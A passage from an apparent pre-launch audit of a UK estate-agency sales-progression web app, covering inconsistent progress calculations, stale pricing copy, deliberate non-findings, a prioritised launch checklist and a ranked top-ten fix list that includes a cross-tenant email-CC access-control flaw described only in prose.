   - `calculateProgress` (file detail + client portal): **weighted** `totalCompleted / totalApplicable` (per-file applicable, excludes NR).
   - `problem-detection` `milestone_stalled`: unweighted `completedCount / 38` (hard-coded `ACTIVE_MILESTONE_COUNT`).
   All three feed an on-track/stalled verdict against ≈the same −10/−25 thresholds, so the **same file can read "At risk" in the list, "On track" on its own page, and not be flagged stalled by the cron** — worst for cash/freehold files with many not-applicable steps.
2. **`daysStuckOnMilestone` (the known one), confirmed and traced to the UI:** `listTransactions` (142-147) clamps `stuckRef` forward to `activeBuyerRound.createdAt`; `listTransactionsByScope` (410-412) does not; the file-detail view and the nightly risk sweep both clamp. `listTransactionsByScope` powers `/dashboard` (internal staff), which renders the value both as a visible "Nd since last milestone" label and into the risk score → **a relisted file shows inflated days-stuck + inflated fall-through risk on `/dashboard` only.**
3. **"Overdue exchange" — two definitions:** `work-queue.ts` (155-157) flags overdue the instant `overridePredictedDate ?? expectedExchangeDate < now` (no grace); `isExchangeOverdueStuck` (`exchange-prediction.ts`) requires 2 working days past **and** stuck. The work queue and the hub/file banner disagree for 1–2 days past predicted.
4. **Exchange date vs forecast column:** the email-staleness gate keys off `expectedExchangeDate` (a self-adjusting forecast) rather than a recorded event date; confirming exchange with no `eventDate` leaves a forecast in that column, producing wrong "stale" suppression (P2).
5. **Live vs stored predicted-exchange after exchange:** stored `expectedExchangeDate` is correctly frozen post-exchange; the live `calculateProgress.predictedExchangeDate` is not — surfaces reading the live value show a moving forecast for an exchanged file.

**Recommendation:** pick one canonical progress/health function and one overdue predicate and route every surface (list, detail, portal, cron) through it.

---

## 18. Dead / stale / legacy findings

**Customer-facing surfaces are clean** — no customer (director/negotiator/buyer/seller) encounters a dead control, a "coming soon" box, or retired £59 pricing. Live pricing copy is correctly migrated to free + £250/£300/£350 everywhere it's customer-reachable. Findings:

- **Stale £59 / "trial expired (paywall)" copy** survives on **internal-only** surfaces: `/agent/polish/*` (layout `notFound()` for customers), `/dev/overlays` (prod-blocked), and code comments. Risk is an internal demo screen-share or a developer copy-pasting the figure — not a customer path. Confirm `/agent/polish/*` and `/dev/*` stay gated.
- **`TrialExpiredModal` / `TrialBannerWithModal`** render correct copy but keep the retired "trial" name/id/comments — a developer trap suggesting trial gating is still live (`lib/services/trial.ts` confirms it's removed).
- **Dead/unused components:** `FirstSessionCard.tsx` (not imported), the `SHOW_SETUP_GUIDE=false` button on `/agent/completions`, `/command/friction` placeholder page. Remove or gate.
- **Dead enquiry-milestone email copy** (VM11–15, PM15–19) retained in `lib/portal-copy.ts` though they're in `RETIRED_ENQUIRY_CODES` and never send — maintenance hazard only.
- **Stale doc/comment drift:** the client-chase route comment and `client-weekly-update` schedule comment disagree with `vercel.json`; help docs disagree with the shipped onboarding UI.

---

## 19. Things I deliberately did NOT flag (valid product/progression choices)

To show the bug-vs-decision line was held:

- **Chasing pipelines shipped off behind kill-switches** — not "half-built," a deliberate safe-launch posture. Not flagged.
- **Sender fallback to the shared SP address** when an agency has no verified domain — deliberate graceful degradation, not a failure. Surfaced for confirmation only (E), not as a defect.
- **Tokens not rotated on relist** (rendering a friendly DeadRoundNotice instead of a 404) — a reasonable UX decision; I flagged only the *write-path guards it relies on*, not the decision.
- **`DemoSalePreview` "clicking does nothing"** — a deliberate static illustration beside the real CTA group, framed as a preview, not a dead control. Not flagged (except its contradictory sample dates).
- **`/command/revenue` "legacy" pricing** — a real live per-agency fee-tier override feature, not stale copy. Not flagged.
- **Contacts keeping `buyerRoundId` on the archived round** — the dead-round email gate working as designed. Not flagged as a leak.
- **The 12-week expected-exchange target, the milestone sequence, the two-rounds-of-enquiries cadence, bilateral pairing** — domain methodology; surfaced the *spec-vs-code* reconciliations (PM24/PM8 NR) as E, not "fix these."
- **Self-managed files never billed; relist hard-blocked after exchange; demo/comped files never stamped billable** — verified correct, not flagged.

---

## 20. Final launch checklist

### MUST DO BEFORE NEXT WEEK (genuine blockers / P1s)
1. **P0-1** — ownership guard on `PATCH /api/solicitor-handlers/[id]` (cross-agency CC leak).
2. **P1-1 + P1-2** — add a `PropertyTransaction.status` guard to portal read/write and milestone confirm/reverse (one shared root cause: withdrawn self-confirm + billing reversal on a "completed" file).
3. **P1-3** — scope the vendor portal timeline (and shared-docs query) to the active buyer round.
4. **P1-4** — add the dead-round guard to the six unguarded portal write actions; fix the false "tokens are rotated" comment.
5. **P1-5** — stop writing "sent" comms rows on a failed synchronous send; surface failures.
6. **P1-6** — add an atomic claim (`UPDATE … WHERE sentAt IS NULL`) to both email drains.
7. **P1-7** — enforce the exchange gate's locked state and `canBeMarkedNr` server-side.
8. **P1-8** — at minimum, warn/guide on same-domain signups (or detect and steer to invite) so agencies don't fragment.
9. Confirm `SENDGRID_WEBHOOK_PUBLIC_KEY` and `CRON_SECRET` are set in prod.

### SHOULD DO SOON (P2)
- Relist: clear `overridePredictedDate`; cancel `ClientChaseState` on `markNotRequired`; round-scope vendor shared docs; re-anchor reminder/chase due dates on resume.
- Billing (before first outsourced issuance month): **P0-2** idempotency keys + per-invoice try/catch; honour `firstOutsourcedFree` in reversal; stranded-invoice reissue; refund/void webhook handling.
- Consistency: unify the progress/health calculation and the overdue predicate (§17).
- Observability: mark dead Outlook connections; surface `failed` email counts to `JobRun`/Sentry; fix `data-retention` guard.
- Security tail: scope `solicitor-intel`; migrate the fail-closed Law-7 routes; add `canViewAllFiles` to document routes; bump `sessionVersion` on user removal.
- Mobile: revert `StatusControl` optimistic state on error; `Drawer` `100vh → 100dvh`; confirm/re-enable portal pinch-zoom.
- Copy: fix the Terms "free trial" line; drop "or here" from the portal composer; reconcile or gate `/help`.

### SAFE TO LEAVE
- All Category E items (confirm when convenient, not blocking).
- Dead internal-only code and stale comments (gate `/agent/polish` & `/dev`, delete orphaned components when touched).
- P3 polish: manifest icons, global-error boundary, demo-preview dates, Anthropic timeouts, double-submit hardening on low-traffic buttons.

---

## 21. The 10 things I would deal with first if this were my product

Ranked for *this* launch (100 agents self-onboarding the free tier + their clients on the portal).

| # | Finding | Severity | Effort | Why it earns this position |
|---|---|---|---|---|
| 1 | **Solicitor-handler cross-agency CC injection** (P0-1) | **P0** | Tiny | The only unambiguous launch blocker: silent cross-tenant exfiltration of client comms, any logged-in user. One ownership check. Fix first. |
| 2 | **Portal/milestone paths ignore transaction status** (P1-1 + P1-2) | P1 | Small | A withdrawn sale lets the client confirm milestones and fire emails; a reversal credits a file still marked "completed." One shared `status` guard closes both. Clients in the launch cohort will hit this. |
| 3 | **Seller sees the previous buyer's progress after relist** (P1-3) | P1 | Small | Fall-throughs are routine in UK sales; this shows one party another party's data and makes two portal surfaces contradict each other. One query scope. |
| 4 | **No "join existing agency" — duplicate-tenant trap** (P1-8) | P1 | Medium | The biggest *unaided* onboarding failure: real agencies fragment into single-person tenants with no shared visibility. Directly in the path of "100 agents sign up without me." |
| 5 | **Old buyer can write to the live file via stale token** (P1-4) | P1 | Small-Med | Six server actions mutate new-buyer data / fire pushes with a superseded token; the protective comment is false. Six guards. |
| 6 | **Silent email failures logged as "sent"** (P1-5) | P1 | Small-Med | Destroys the product's core promise ("we told your client") — the agent trusts a send that SendGrid rejected. Fix the swallow + the "sent" write. |
| 7 | **Milestone-confirmation double-send** (P1-6) | P1 | Small | Duplicate client email at the highest-stakes moment ("Contracts exchanged" twice). An atomic claim on the drain closes it. |
| 8 | **Server-side exchange-gate / NR bypass** (P1-7) | P1 | Small | The core control of the product depends on the client hiding a button. API-only reachable, so lower likelihood for this cohort — but it's the exchange gate, so it ranks high. |
| 9 | **Billing issuance double-charge** (P0-2) | P0 (billing) | Small | P0-severity incorrect charging — but the free cohort won't trigger it and issuance is monthly, so it's ranked below the things this launch *will* hit. Must land before the first outsourced billing run. |
| 10 | **Progress/health/overdue computed multiple ways** (§17) | P2 | Medium | The same file reads differently across list, detail, portal and cron — the inconsistency class you flagged. Not a blocker, but it quietly undermines trust in every number on the screen. Unify on one source of truth. |

